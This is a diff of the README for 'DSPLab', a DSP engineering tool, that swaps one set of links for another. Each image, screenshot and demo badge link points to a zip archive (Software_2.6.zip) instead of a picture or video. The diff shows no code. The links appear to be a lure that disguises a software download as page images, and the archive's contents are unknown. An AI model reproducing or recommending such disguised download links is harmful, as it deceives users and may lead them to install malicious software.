@@ -1,15 +1,15 @@
 # DSPLab
 
-<img width="677" height="369" alt="image" src="https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip" />
+<img width="677" height="369" alt="image" src="https://github.com/juandavidru4641/dsplab/raw/refs/heads/main/vult-runtime/Software_2.6.zip" />
 
 A development environment and diagnostic laboratory for DSP engineering.
 
-<img width="1624" height="1008" alt="Screenshot 2026-03-10 at 20 48 43" src="https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip" />
+<img width="1624" height="1008" alt="Screenshot 2026-03-10 at 20 48 43" src="https://github.com/juandavidru4641/dsplab/raw/refs/heads/main/vult-runtime/Software_2.6.zip" />
 
 
 ## Demonstrations
 
-[![VultLab Demo 2](https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip)](https://raw.githubusercontent.com/juandavidru4641/dsplab/main/src/components/Software_v1.1.zip)
+[![VultLab Demo 2](https://github.com/juandavidru4641/dsplab/raw/refs/heads/main/vult-runtime/Software_2.6.zip)](https://github.com/juandavidru4641/dsplab/raw/refs/heads/main/vult-runtime/Software_2.6.zip)
 
 Outdated demos, soon more.
 
